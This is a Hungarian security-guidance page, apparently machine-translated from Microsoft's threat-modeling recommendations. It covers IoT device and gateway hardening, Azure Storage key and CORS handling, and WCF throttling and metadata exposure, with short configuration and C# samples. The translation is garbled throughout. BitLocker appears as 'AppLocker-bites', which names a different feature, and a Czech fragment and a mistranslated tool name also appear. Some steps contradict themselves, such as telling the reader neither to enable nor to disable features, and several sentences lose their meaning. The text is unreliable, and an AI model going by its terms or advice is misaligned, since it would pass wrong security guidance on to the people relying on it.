## <a id="admin-strong"></a>Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL fázis**               | Környezet |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | –  |
| **Lépések** | Bármely felügyeleti felületek, amelyek az eszköz nebo Pole átjáró közzétesz erős hitelesítő adatok használatával kell védeni. Is bármely egyéb közzétett felületek, például Wi-Fi, SSH, fájlmegosztások, FTP erős hitelesítő adatokkal kell biztosítani. A gyenge jelszavakat nem lehet alapértelmezett. |

## <a id="unknown-exe"></a>Győződjön meg arról, hogy ismeretlen kód nem hajtható végre, az eszközökön

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [A biztonságos rendszerindítás és a Windows 10 IoT Core-bit-tároló az Eszköztitkosítás engedélyezése](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Lépések** | UEFI biztonságos rendszerindítás korlátozza a rendszer csak a megadott szolgáltató által aláírt bináris fájlok futtatását teszi lehetővé. Ez a funkció megakadályozza, hogy ismeretlen kód folyamatban hajtja végre a platform és potenciálisan gyengítése, biztonsági állapotát. UEFI biztonságos rendszerindítás engedélyezése és a kód aláírása megbízható hitelesítésszolgáltatók listájának korlátozása azokra. Jelentkezzen az eszközön a megbízható hitelesítésszolgáltatók használatával üzembe helyezett összes kódot. |

## <a id="partition-iot"></a>Az operációs rendszer és az AppLocker-bites az IoT-eszközök további partíciók titkosítása

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | –  |
| **Lépések** | Windows 10 IoT Core egy egyszerűsített verziója maga erős a platformon, beleértve a szükséges preOS protokoll, amely hajt végre a szükséges mérési UEFI TPM jelenlétét az AppLocker-bites eszközszintű titkosítással valósítja meg. Ezeknek a méréseknek preOS győződjön meg arról, hogy az operációs rendszer újabb van-e, hogy az operációs rendszer elindult végleges bejegyzése. Az AppLocker-bites és partíciókat is használatával abban az esetben minden bizalmas adatot tárolják az operációs rendszer partíciók titkosítása. |

## <a id="min-enable"></a>Győződjön meg arról, hogy csak a minimális szolgáltatásokat és funkciókat engedélyezve vannak-e az eszközökön

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT-eszköz | 
| **SDL fázis**               | Környezet |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | –  |
| **Lépések** | Ne engedélyezze és ne kapcsolja ki a más funkcióinak és az operációs rendszer, amely nem a megoldás a működéséhez szükséges szolgáltatásokat. A példa: Ha az eszköz nincs szükség a központi felhasználói felületen, telepítse a Windows IoT Core távfelügyelt módban. |

## <a id="field-bit-locker"></a>Az operációs rendszer és az AppLocker-bites mező IoT-átjáró további partíciók titkosítása

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT helyszíni átjáró | 
| **SDL fázis**               | Környezet |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | –  |
| **Lépések** | Windows 10 IoT Core egy egyszerűsített verziója maga erős a platformon, beleértve a szükséges preOS protokoll, amely hajt végre a szükséges mérési UEFI TPM jelenlétét az AppLocker-bites eszközszintű titkosítással valósítja meg. Ezeknek a méréseknek preOS győződjön meg arról, hogy az operációs rendszer újabb van-e, hogy az operációs rendszer elindult végleges bejegyzése. Az AppLocker-bites és partíciókat is használatával abban az esetben minden bizalmas adatot tárolják az operációs rendszer partíciók titkosítása. |

## <a id="default-change"></a>Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat a helyszíni átjáró az módosítják a telepítés során

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT helyszíni átjáró | 
| **SDL fázis**               | Környezet |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | –  |
| **Lépések** | Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat a helyszíni átjáró az módosítják a telepítés során |

## <a id="cloud-firmware"></a>Győződjön meg arról, hogy a Felhőátjáró valósít meg egy folyamatot, hogy a csatlakoztatott eszközök belső vezérlőprogramjának naprakészen tartása

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | IoT átjáró | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | Átjáró kiválasztása – Azure IoT Hub |
| **Hivatkozások**              | [Az IoT Hub Device Management áttekintése](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [eszköz belső vezérlőprogramjának frissítése](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **Lépések** | LWM2M egy olyan protokoll, az Open Mobile Alliance IoT eszközfelügyeleti. Az Azure IoT-Eszközfelügyelet lehetővé teszi, hogy a fizikai eszközöket eszközfeladatok használata kezelheti. Győződjön meg arról, hogy a Felhőátjáró valósít meg egy folyamatot, hogy rendszeresen tartsa meg az eszköz és más konfigurációs adatokat az Azure IoT Hub-Eszközfelügyelet segítségével naprakész. |

## <a id="controls-policies"></a>Győződjön meg arról, hogy eszközök rendelkeznek-e a szervezeti szabályzatok szerint konfigurált végponti biztonsági vezérlőket

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Gép megbízhatósági kapcsolat határán | 
| **SDL fázis**               | Környezet |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | –  |
| **Lépések** | Győződjön meg arról, hogy eszközök rendelkeznek végponti biztonsági vezérlők, például lemezszintű titkosítás, a víruskereső frissített jogosultságkódokkal bit-tárolót, gazdagép alapú tűzfal, operációs rendszer verziófrissítései, stb. a szervezeti biztonsági házirendek alapján vannak konfigurált szabályzatok csoportban. |

## <a id="secure-keys"></a>Győződjön meg, hogy az Azure storage hozzáférési kulcsok biztonságos felügyeletéhez

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Azure Storage | 
| **SDL fázis**               | Környezet |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [Az Azure Storage biztonsági útmutatóját - kezelése a Storage Account Keys](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Lépések** | <p>Kulcstároló: Javasoljuk az Azure tárelérési kulcsok tárolására az Azure Key Vaultban titkos kulcs, és az alkalmazások a kulcs lekérése a kulcstartóból. Ez a következő okok miatt ajánlott:</p><ul><li>Az alkalmazás soha nem lesznek a storage-kulcs szoftveresen kötött a konfigurációs fájlban, amely eltávolítja a sérülésre valaki hozzáférni az adott engedély nélkül a kulcsokat</li><li>A kulcsok a hozzáférést az Azure Active Directory használatával lehet irányítani. Ez azt jelenti, hogy fiók tulajdonosa adhat hozzáférést a kulcsok lekéréséhez az Azure Key vault igénylő alkalmazások néhány. Más alkalmazások nem tudják a hívóbetűk adva nekik kifejezetten engedély nélkül</li><li>Kulcs újragenerálása: Azt javasoljuk, hogy egy folyamatot, hogy biztonsági okokból az Azure tárelérési kulcsok újragenerálása. Arról, hogy miért részleteit és a kulcs újragenerálása megtervezése az Azure Storage biztonsági útmutatóját áttekintésével foglalkozó cikkben vannak dokumentálva</li></ul>|

## <a id="cors-storage"></a>Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az Azure storage

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Azure Storage | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | Általános |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [CORS-támogatás az Azure Storage-szolgáltatásokban](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Lépések** | Az Azure Storage lehetővé teszi, hogy engedélyezze a CORS-idegen eredetű erőforrások megosztása. Minden olyan tárfiókhoz a tárfiók az erőforrások eléréséhez tartományok is megadhat. A CORS az összes szolgáltatás alapértelmezés szerint le van tiltva. A CORS szolgáltatás házirendek beállítása a módszerek meghívására a REST API vagy a storage ügyféloldali kódtár használatával engedélyezheti. |

## <a id="throttling"></a>A szolgáltatás szabályozása a WCF szolgáltatás engedélyezése

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | WCF | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | .NET-keretrendszer 3 |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com) |
| **Lépések** | <p>Korlát nem helyezi a felhasznált rendszererőforrás erőforrás-fogyási típus és végső soron szolgáltatásmegtagadást eredményezheti.</p><ul><li>**Magyarázat:** Windows Communication Foundation (WCF) lehetőséget biztosít a szolgáltatáskérések szabályozását. Túl sok ügyfél kérésének engedélyezése kéréssekkel túlterhelheti a rendszer, és felhasználta a rendelkezésére az erőforrások. Másrészről így csak kevés egy szolgáltatáshoz érkező kérések megakadályozhatja legitim felhasználók a szolgáltatás használatával. Egyes szolgáltatások külön-külön használatára vannak konfigurálva és konfigurálni kell az erőforrások a megfelelő mennyiségét engedélyezi.</li><li>**JAVASLATOK** az alkalmazás megfelelő engedélyezése WCF szolgáltatás sávszélesség-szabályozási funkciót, és a beállított korlátokat.</li></ul>|

### <a name="example"></a>Példa
Az alábbiakban látható egy példa konfiguráció látható sávszélesség-szabályozás engedélyezve:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>WCF-adatokhoz való illetéktelen hozzáférés, metaadatok keresztül

| Beosztás                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | WCF | 
| **SDL fázis**               | Felépítés |  
| **Megfelelő technológiák** | .NET-keretrendszer 3 |
| **Attribútumok**              | –  |
| **Hivatkozások**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [erősítse meg Királyság](https://vulncat.fortify.com) |
| **Lépések** | Metaadatok segítségével a támadók ismerje meg a rendszer, és a támadás űrlap tervezi. WCF-szolgáltatások elérhetővé metaadatok konfigurálható. Metaadatok szolgáltatás részletes ismertetése információkat nyújt, és nem kell az éles környezetben szórási. A `HttpGetEnabled`  /  `HttpsGetEnabled` ServiceMetaData osztály tulajdonságait határozza meg, hogy egy szolgáltatás a metaadatok teszi közzé. | 

### <a name="example"></a>Példa
Az alábbi kód arra utasítja a WCF-szolgáltatás metaadatai adás
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Éles környezetben a szolgáltatás metaadatai nem küldhet. Állítsa be a HttpGetEnabled / hamis osztály a ServiceMetaData HttpsGetEnabled tulajdonságait. 

### <a name="example"></a>Példa
Az alábbi kódot a WCF-szolgáltatás metaadatai nem adás utasítja. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
